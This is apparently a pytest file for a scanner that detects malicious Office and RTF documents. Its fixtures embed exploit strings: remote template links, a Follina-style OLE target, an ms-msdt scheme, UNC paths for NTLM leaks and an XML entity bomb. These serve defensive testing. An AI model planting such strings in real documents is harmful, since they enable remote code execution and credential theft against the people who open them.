import pytest

from detectors.relationship_scanner import DEFUSEDXML_AVAILABLE, RelationshipScanner, defang
from tests.helpers import make_docx, rel, rels_xml, rewrite_zip

S = RelationshipScanner()
pytestmark = pytest.mark.skipif(not DEFUSEDXML_AVAILABLE, reason="defusedxml missing")


def _doc_with_rels(tmp_path, name, part, *relationships):
    base = make_docx(tmp_path / "base.docx")
    return rewrite_zip(base, tmp_path / name, {part: rels_xml(*relationships)})


def test_clean_docx_has_no_findings(tmp_path):
    res = S.scan_file(make_docx(tmp_path / "ok.docx"))
    assert res.checked and not res.findings


def test_remote_template_injection(tmp_path):
    p = _doc_with_rels(tmp_path, "rti.docx", "word/_rels/settings.xml.rels",
                       rel("rId1", "attachedTemplate", "http://203.0.113.9/t.dotm"))
    res = S.scan_file(p)
    assert res.kinds == ["remote_template"]
    assert res.findings[0].target == "http://203.0.113.9/t.dotm"


def test_follina_style_external_ole(tmp_path):
    p = _doc_with_rels(tmp_path, "follina.docx", "word/_rels/document.xml.rels",
                       rel("rId1", "oleObject", "http://198.51.100.7/index.html!"))
    assert S.scan_file(p).kinds == ["follina_style_ole"]


def test_exploit_scheme_even_in_a_hyperlink(tmp_path):
    p = _doc_with_rels(tmp_path, "msdt.docx", "word/_rels/document.xml.rels",
                       rel("rId1", "hyperlink", "ms-msdt:/id PCWDiagnostic /skip force"))
    assert S.scan_file(p).kinds == ["exploit_scheme"]


def test_unc_path_ntlm_leak(tmp_path):
    p = _doc_with_rels(tmp_path, "unc.docx", "word/_rels/document.xml.rels",
                       rel("rId1", "image", "\\\\192.0.2.10\\share\\logo.png"))
    assert S.scan_file(p).kinds == ["unc_ntlm_leak"]


def test_ordinary_external_hyperlinks_and_images_are_ignored(tmp_path):
    p = _doc_with_rels(tmp_path, "links.docx", "word/_rels/document.xml.rels",
                       rel("rId1", "hyperlink", "https://example.com/report"),
                       rel("rId2", "image", "https://example.com/logo.png"),
                       rel("rId3", "styles", "styles.xml", external=False))
    assert S.scan_file(p).findings == []


def test_rtf_remote_template_and_ole_autoupdate(tmp_path):
    p = tmp_path / "x.rtf"
    p.write_bytes(b"{\\rtf1{\\*\\template http://203.0.113.9/t.dot}"
                  b"{\\object\\objautlink\\objupdate{\\*\\objdata 0105}}}")
    assert set(S.scan_file(p).kinds) == {"rtf_remote_template", "rtf_ole_autoupdate"}


def test_rtf_local_template_is_fine(tmp_path):
    p = tmp_path / "ok.rtf"
    p.write_bytes(b"{\\rtf1{\\*\\template C:\\\\Users\\\\me\\\\Normal.dotm} hello}")
    assert S.scan_file(p).findings == []


def test_rtf_disguised_as_doc_is_checked(tmp_path):
    p = tmp_path / "invoice.doc"
    p.write_bytes(b"{\\rtf1{\\*\\template \\\\\\\\192.0.2.1\\\\x\\\\t.dot}}")
    assert S.scan_file(p).kinds == ["rtf_remote_template"]


def test_hostile_xml_does_not_crash(tmp_path):
    bomb = (b'<?xml version="1.0"?><!DOCTYPE l [<!ENTITY a "aaaaaaaaaa">'
            b'<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">]>'
            b'<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            b'<Relationship Id="r" Type="t" Target="&b;"/></Relationships>')
    base = make_docx(tmp_path / "base.docx")
    p = rewrite_zip(base, tmp_path / "bomb.docx", {"word/_rels/document.xml.rels": bomb})
    res = S.scan_file(p)                       # defusedxml refuses entity declarations
    assert res.findings == [] and "error" in res.detail.lower()


def test_defang():
    assert defang("http://evil.example.com/a.dotm") == "hxxp://evil.example[.]com/a.dotm"


def test_a_broken_part_keeps_the_findings_of_the_others(tmp_path):
    """M31 (owner-approved 2026-11-12, the M13 (b) rule): one malformed .rels part,
    in an order the attacker chooses, dropped what the other parts found and the
    file read Clean (partial). The findings stay; the broken part is named."""
    base = make_docx(tmp_path / "base.docx")
    p = rewrite_zip(base, tmp_path / "bad.docx", {
        "word/_rels/settings.xml.rels": rels_xml(
            rel("rId1", "attachedTemplate", "http://203.0.113.5/t.dotm")),
        "zz/_rels/x.xml.rels": b"<Relationships"})
    res = S.scan_file(p)
    assert res.kinds == ["remote_template"] and res.checked
    assert "zz/_rels/x.xml.rels" in res.error
    assert res.as_dict()["error"] and "error" in res.detail.lower()


def test_a_broken_part_makes_the_scan_partial_and_keeps_the_verdict(tmp_path):
    """Check 23 end to end: High 70 complete, and with the broken part High 70 partial
    (it read Clean 0 partial before)."""
    import RansomwareScanner as RS
    from tests.test_scanner_integration import _config
    s = RS.RansomwareScanner(_config(tmp_path, isolate_scans=False))
    base = make_docx(tmp_path / "base.docx")
    good = {"word/_rels/settings.xml.rels": rels_xml(
        rel("rId1", "attachedTemplate", "http://203.0.113.5/t.dotm"))}
    one = s.scan_file(str(rewrite_zip(base, tmp_path / "scan" / "remote.docx", good)))
    two = s.scan_file(str(rewrite_zip(base, tmp_path / "scan" / "remote_bad.docx",
                                      dict(good, **{"zz/_rels/x.xml.rels": b"<Relationships"}))))
    assert (one["verdict"], one["risk_score"], one["scan_status"]) == ("High", 70, "complete")
    assert (two["verdict"], two["risk_score"], two["scan_status"]) == ("High", 70, "partial")
    assert "external_relationship" in [c["indicator"]
                                       for c in two["score_breakdown"]["contributions"]]
    assert any("zz/_rels/x.xml.rels" in g["reason"] for g in two["incomplete_reasons"])
